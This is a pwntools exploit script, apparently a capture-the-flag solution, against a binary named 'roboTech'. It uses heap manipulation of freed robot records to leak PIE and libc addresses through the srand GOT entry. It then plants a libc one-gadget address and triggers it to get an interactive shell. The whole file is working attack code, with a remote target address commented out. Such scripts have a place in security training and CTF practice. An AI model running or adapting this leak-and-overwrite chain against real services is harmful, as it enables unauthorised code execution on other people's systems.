from pwn import *

context.terminal = ['tmux', 'split-window', '-h']

elf = ELF('./roboTech', checksec=False)
# r = remote('192.168.1.19', 50102)
# libc = ELF('./libc.so.6', checksec=False)
libc = ELF('/opt/glibc/2.23/64/usr/lib/libc.so.6', checksec=False)
r = process('./roboTech', aslr=1)
menu = 'choice:\n> '
        
def assign(l, name, job):
    r.sendlineafter(menu, '1')
    r.sendlineafter('(max 100)?\n> ', str(l))
    r.sendlineafter('name!\n> ', str(name))
    r.sendlineafter('shell\n> ', str(job))
    # r.recvuntil('ID : ')
    # return int(r.recvline(False))

def show(bug=0):
    r.sendlineafter(menu, '3')
    r.recvuntil('Robot list:\n\n')
    tmp = r.recvline(False)
    cnt = 0
    robot = [] 
    while tmp != 'MENU':
        t = {}
        t['id'] = tmp.split(': ')[1]
        tmp = r.recvline(False)
        t['name'] = tmp.split(': ')[1]
        tmp = r.recvline(False)
        t['job'] = tmp.split(': ')[1]
        r.recvline()
        tmp = r.recvline(False)
        robot.append(t)
    return robot

def delete(ID):
    r.sendlineafter(menu, '4')
    r.sendlineafter('robot\n> ', str(ID))

def job(ID):
    r.sendlineafter(menu, '2')
    r.sendlineafter('robot\n> ', str(ID))

assign(0x37, 'A' * 0x37, 1)
assign(0x37, 'B' * 0x37, 1)
assign(0x37, 'C' * 0x37, 1)
assign(0x37, 'D' * 0x37, 1)

cur = show()

info(cur)

leak = cur[0]['job']
leak = u64(leak.ljust(8, '\x00'))
pie = leak - 0x1290
elf.address = pie
info(hex(pie))

delete(cur[0]['id'])
delete(cur[1]['id'])
delete(cur[2]['id'])
delete(cur[3]['id'])

payload  = p64(elf.got['srand'])
payload += p64(0x4141414141414141)
payload += 'A' * 0x7
assign(0x17, payload, 1)

cur = show()

leak = cur[2]['name']
leak = u64(leak.ljust(8, '\x00'))
libc.address = leak - libc.symbols['srand']
info(hex(libc.address))

# gdb.attach(r, 'brva 0x1988')

payload  = p64(elf.got['srand'])
payload += p64(0xdeadbeefdeadbeef)
payload += p64(libc.address + 0x4098e)[:7]
# payload += p64(libc.address + 0x45216)[:7]
assign(0x17, payload, 1)

cur = show()

job(cur[0]['id'])

r.interactive()
